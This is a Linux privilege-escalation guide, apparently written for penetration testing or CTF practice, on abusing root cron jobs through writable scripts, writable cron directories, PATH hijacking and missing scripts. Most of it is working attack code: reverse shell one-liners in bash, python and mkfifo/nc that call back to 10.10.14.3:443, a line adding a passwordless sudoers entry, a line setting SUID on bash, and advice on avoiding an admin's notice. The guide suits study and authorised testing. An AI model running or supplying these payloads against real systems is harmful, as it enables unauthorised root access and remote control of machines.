## Cron Job Abuse

Cron jobs are scheduled tasks run by the cron daemon based on entries in a crontab file. The format is six fields: `minute hour day month weekday command`. When a cron job runs as root and touches a file or script that a low-privilege user can modify, it becomes a direct privilege escalation path. 

***

## Cron Syntax Quick Reference

```
* * * * * command
| | | | |
| | | | └─ Day of week (0-7, Sunday = 0 or 7)
| | | └─── Month (1-12)
| | └───── Day of month (1-31)
| └─────── Hour (0-23)
└───────── Minute (0-59)
```

Common patterns:
```
*/3 * * * *          Every 3 minutes
0 */12 * * *         Every 12 hours
0 2 * * *            Daily at 02:00
@reboot              Once on system boot
```

***

## Enumeration

### Static Inspection

```bash
# System-wide crontab
cat /etc/crontab

# Application cron drop-ins
ls -la /etc/cron.d/
ls -la /etc/cron.daily/
ls -la /etc/cron.hourly/
ls -la /etc/cron.weekly/
ls -la /etc/cron.monthly/

# Per-user crontabs
crontab -l
cat /var/spool/cron/crontabs/* 2>/dev/null

# World-writable files and directories (likely cron-related targets)
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
```

### Dynamic Monitoring with pspy

Static inspection only shows cron jobs you have permission to read. `pspy` monitors process creation events in real time by reading from `/proc` without needing root.  This catches jobs run by other users, hidden crontabs, and `at` jobs that static inspection misses entirely. 

```bash
# Transfer to target
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64
chmod +x pspy64

# Run with process and filesystem event output, scan every second
./pspy64 -pf -i 1000
```

Watch the output for `UID=0` entries, which are processes running as root. Cross-reference the command paths with files you can write to.

***

## Attack Vector 1: World-Writable Script

The most direct path. A root cron job calls a script that any user can write to.

### Identification

```bash
# Find writable files and check if any match cron job paths
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null

# Check permissions of a specific script
ls -la /dmz-backups/backup.sh
# -rwxrwxrwx 1 root root 230 Aug 31 02:39 backup.sh
```

The timestamp pattern of files created by the script reveals execution frequency without reading the crontab. Files created every 3 minutes confirm `*/3 * * * *` in the schedule. 

### Exploitation

Always back up the original script before modifying it. Append your payload rather than replacing the file to avoid breaking the cron job's own logic, which could alert an admin. 

```bash
# Back up the original
cp /dmz-backups/backup.sh /tmp/backup.sh.bak

# Option 1: Reverse shell appended to the script
echo 'bash -i >& /dev/tcp/10.10.14.3/443 0>&1' >> /dmz-backups/backup.sh

# Option 2: Add yourself to sudoers
echo 'echo "currentuser ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers' >> /dmz-backups/backup.sh

# Option 3: Set SUID bit on bash
echo 'chmod +s /bin/bash' >> /dmz-backups/backup.sh
```

Start your listener and wait:

```bash
nc -lnvp 443
# Connection arrives when the cron job fires
```

***

## Attack Vector 2: Writable Cron Directory

If a directory in `/etc/cron.d/` or `/etc/cron.daily/` is world-writable, you can drop an entirely new cron job file there.

```bash
# Check directory permissions
ls -la /etc/cron.d/

# If writable, create a new job file
echo '* * * * * root bash -i >& /dev/tcp/10.10.14.3/443 0>&1' > /etc/cron.d/root_shell
```

Cron files in `/etc/cron.d/` follow the same syntax as `/etc/crontab` and include a username field before the command.

***

## Attack Vector 3: PATH Hijacking via Cron

If the crontab uses a relative command name or defines a `PATH` that includes a writable directory, you can place a malicious script that runs instead of the intended binary.

```bash
# Check if the crontab defines a PATH variable
cat /etc/crontab | grep PATH
# PATH=/home/user:/usr/local/sbin:/usr/local/bin

# If /home/user is writable and appears before the real binary location:
echo '#!/bin/bash' > /home/user/tar
echo 'bash -i >& /dev/tcp/10.10.14.3/443 0>&1' >> /home/user/tar
chmod +x /home/user/tar
```

***

## Attack Vector 4: Missing Script (Script Doesn't Exist Yet)

If a cron job references a script path that does not yet exist but is in a directory you can write to, you can create the script yourself. 

```bash
# crontab entry: */1 * * * * root /opt/scripts/health-check.sh
ls -la /opt/scripts/
# Directory exists but health-check.sh is absent

# If the directory is writable:
echo '#!/bin/bash' > /opt/scripts/health-check.sh
echo 'bash -i >& /dev/tcp/10.10.14.3/443 0>&1' >> /opt/scripts/health-check.sh
chmod +x /opt/scripts/health-check.sh
```

***

## Reverse Shell Payloads for Cron

```bash
# Bash TCP
bash -i >& /dev/tcp/10.10.14.3/443 0>&1

# Bash with /dev/tcp using exec (more reliable in restricted environments)
exec 5<>/dev/tcp/10.10.14.3/443;cat <&5 | while read line; do $line 2>&5 >&5; done

# Python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.14.3",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Named pipe (most reliable, works even without /dev/tcp)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.3 443 >/tmp/f
```

***

## Cron Job Abuse Decision Tree

| Condition | Attack |
|---|---|
| Cron script is world-writable | Append reverse shell or payload to script |
| Cron script directory is world-writable | Drop new cron file or replace script |
| Cron calls command with relative path | PATH hijack: place malicious binary in writable PATH dir |
| Cron script does not exist, dir is writable | Create the script with your payload |
| Wildcard in cron `tar`/`rsync` command | Wildcard injection (covered in previous section) |
| Can read cron but nothing writable | Wait and use pspy to discover what other scripts are called indirectly |

After any successful cron exploitation, wait for confirmation of the shell and immediately stabilise it with `python3 -c 'import pty; pty.spawn("/bin/bash")'` before doing anything else, as the connection will drop the next time the cron job resets.
